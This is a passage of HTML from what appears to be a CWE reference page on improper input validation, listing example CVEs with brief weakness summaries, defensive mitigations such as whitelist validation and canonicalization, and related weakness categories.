&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3790" target="_blank"&gt;CVE-2006-3790&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;size field that is inconsistent with packet size
leads to buffer over-read&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2309" target="_blank"&gt;CVE-2008-2309&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;product uses a blacklist to identify potentially
dangerous content, allowing attacker to bypass a
warning&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3494" target="_blank"&gt;CVE-2008-3494&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;security bypass via an extra
header&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5462" target="_blank"&gt;CVE-2006-5462&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;use of extra data in a signature allows
certificate signature forging&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3571" target="_blank"&gt;CVE-2008-3571&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;empty packet triggers
reboot&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5525" target="_blank"&gt;CVE-2006-5525&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;incomplete blacklist allows SQL
injection&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1284" target="_blank"&gt;CVE-2008-1284&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;NUL byte in theme name cause directory traversal
impact to be worse&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0600" target="_blank"&gt;CVE-2008-0600&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;kernel does not validate an incoming pointer
before dereferencing it&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1738" target="_blank"&gt;CVE-2008-1738&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;anti-virus product has insufficient input
validation of hooked SSDT functions, allowing code
execution&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1737" target="_blank"&gt;CVE-2008-1737&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;anti-virus product allows DoS via zero-length
field&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3464" target="_blank"&gt;CVE-2008-3464&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;driver does not validate input from userland to
the kernel&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2252" target="_blank"&gt;CVE-2008-2252&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;kernel does not validate parameters sent in from
userland, allowing code execution&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2374" target="_blank"&gt;CVE-2008-2374&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;lack of validation of string length fields allows
memory consumption or buffer over-read&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1440" target="_blank"&gt;CVE-2008-1440&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;lack of validation of length field leads to
infinite loop&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1625" target="_blank"&gt;CVE-2008-1625&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;lack of validation of input to an IOCTL allows
code execution&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3177" target="_blank"&gt;CVE-2008-3177&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;zero-length attachment causes
crash&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2442" target="_blank"&gt;CVE-2007-2442&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;zero-length input causes free of uninitialized
pointer&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5563" target="_blank"&gt;CVE-2008-5563&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;crash via a malformed frame
structure&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5285" target="_blank"&gt;CVE-2008-5285&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;infinite loop from a long SMTP
request&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3812" target="_blank"&gt;CVE-2008-3812&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;router crashes with a malformed
packet&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3680" target="_blank"&gt;CVE-2008-3680&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;packet with invalid version number leads to NULL
pointer dereference&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3660" target="_blank"&gt;CVE-2008-3660&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;crash via multiple "." characters in file
extension&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_20_Potential Mitigations" id="oc_20_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p class="optheading"&gt;Strategies:  Input Validation; Libraries or Frameworks&lt;/p&gt;&lt;p&gt;Use an input validation framework such as Struts or the OWASP ESAPI
Validation API. If you use Struts, be mindful of weaknesses covered by
the CWE-101 category.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Architecture and Design; Implementation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Identify and Reduce Attack Surface&lt;/p&gt;&lt;p&gt;Understand all the potential areas where untrusted inputs can enter
your software: parameters or arguments, cookies, anything read from the
network, environment variables, reverse DNS lookups, query results,
request headers, URL components, e-mail, files, databases, and any
external systems that provide data to the application. Remember that
such inputs may be obtained indirectly through API calls.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p class="optheading"&gt;Strategy:  Input Validation&lt;/p&gt;&lt;p&gt;Assume all input is malicious. Use an "accept known good" input
validation strategy, i.e., use a whitelist of acceptable inputs that
strictly conform to specifications. Reject any input that does not
strictly conform to specifications, or transform it into something that
does. Do not rely exclusively on looking for malicious or malformed
inputs (i.e., do not rely on a blacklist). However, blacklists can be
useful for detecting potential attacks or determining which inputs are
so malformed that they should be rejected outright.&lt;/p&gt;&lt;p&gt;When performing input validation, consider all potentially relevant
properties, including length, type of input, the full range of
acceptable values, missing or extra inputs, syntax, consistency across
related fields, and conformance to business rules. As an example of
business rule logic, "boat" may be syntactically valid because it only
contains alphanumeric characters, but it is not valid if you are
expecting colors such as "red" or "blue."&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;For any security checks that are performed on the client side, ensure
that these checks are duplicated on the server side, in order to avoid
CWE-602. Attackers can bypass the client-side checks by modifying values
after the checks have been performed, or by changing the client to
remove the client-side checks entirely. Then, these modified values
would be submitted to the server.&lt;/p&gt;&lt;p&gt;Even though client-side checks provide minimal benefits with respect
to server-side security, they are still useful. First, they can support
intrusion detection. If the server receives input that should have been
rejected by the client, then it may be an indication of an attack.
Second, client-side error-checking can provide helpful feedback to the
user about the expectations for valid input. Third, there may be a
reduction in server-side processing time for accidental input errors,
although this is typically a small savings.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Do not rely exclusively on blacklist validation to detect malicious
input or to encode output (CWE-184). There are too many ways to encode
the same character, so you're likely to miss some variants.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;When your application combines data from multiple sources, perform the
validation after the sources have been combined. The individual data
elements may pass the validation step but violate the intended
restrictions after they have been combined.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Be especially careful to validate your input when you invoke code that
crosses language boundaries, such as from an interpreted language to
native code. This could create an unexpected interaction between the
language boundaries. Ensure that you are not violating any of the
expectations of the language with which you are interfacing. For
example, even though Java may not be susceptible to buffer overflows,
providing a large argument in a call to native code might trigger an
overflow.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Directly convert your input type into the expected data type, such as
using a conversion function that translates a string into a number.
After converting to the expected data type, ensure that the input's
values fall within the expected range of allowable values and that
multi-field consistencies are maintained.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Inputs should be decoded and canonicalized to the application's
current internal representation before being validated (CWE-180,
CWE-181). Make sure that your application does not inadvertently decode
the same input twice (CWE-174). Such errors could be used to bypass
whitelist schemes by introducing dangerous inputs after they have been
checked. Use libraries such as the OWASP ESAPI Canonicalization
control.&lt;/p&gt;&lt;p&gt;Consider performing repeated canonicalization until your input does
not change any more. This will avoid double-decoding and similar
scenarios, but it might inadvertently modify inputs that are allowed to
contain properly-encoded dangerous content.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;When exchanging data between components, ensure that both components
are using the same character encoding. Ensure that the proper encoding
is applied at each interface. Explicitly set the encoding you are using
whenever the protocol allows you to do so.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use automated static analysis tools that target this type of weakness.
Many modern techniques use data flow analysis to minimize the number of
false positives. This is not a perfect solution, since 100% accuracy and
coverage are not feasible.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Testing&lt;/p&gt;&lt;p&gt;Use dynamic tools and techniques that interact with the software using
large test suites with many diverse inputs, such as fuzz testing
(fuzzing), robustness testing, and fault injection. The software's
operation may slow down, but it should not become unstable, crash, or
generate incorrect results.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_20_Relationships" id="oc_20_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;19&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=19" target="_blank"&gt;Data Handling&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;693&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=693" target="_blank"&gt;Protection Mechanism Failure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;722&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=722" target="_blank"&gt;OWASP Top Ten 2004 Category A1 - Unvalidated Input&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;738&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=738" target="_blank"&gt;CERT C Secure Coding Section 04 - Integers (INT)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;734&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;742&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=742" target="_blank"&gt;CERT C Secure Coding Section 08 - Memory Management (MEM)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard&lt;/span&gt;734&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;746&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=746" target="_blank"&gt;CERT C Secure Coding Section 12 - Error Handling (ERR)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard&lt;/span&gt;734&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;747&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=747" target="_blank"&gt;CERT C Secure Coding Section 49 - Miscellaneous (MSC)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses Addressed by the CERT C Secure Coding Standard&lt;/span&gt;734&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;751&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=751" target="_blank"&gt;2009 Top 25 - Insecure Interaction Between Components&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2009 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;750&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;22&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=22" target="_blank"&gt;Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;41&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=41" target="_blank"&gt;Improper Resolution of Path Equivalence&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;CanPrecede&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;74&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=74" target="_blank"&gt;Failure to Sanitize Data into a Different Plane ('Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;15&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=15" target="_blank"&gt;External Control of System or Configuration Setting&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;21&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=21" target="_blank"&gt;Pathname Traversal and Equivalence Errors&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;73&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=73" target="_blank"&gt;External Control of File Name or Path&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;77&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=77" target="_blank"&gt;Improper Sanitization of Special Elements used in a Command ('Command Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;79&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=79" target="_blank"&gt;Failure to Preserve Web Page Structure ('Cross-site Scripting')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;89&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=89" target="_blank"&gt;Improper Sanitization of Special Elements used in an SQL Command ('SQL Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;99&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=99" target="_blank"&gt;Improper Control of Resource Identifiers ('Resource Injection')&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven 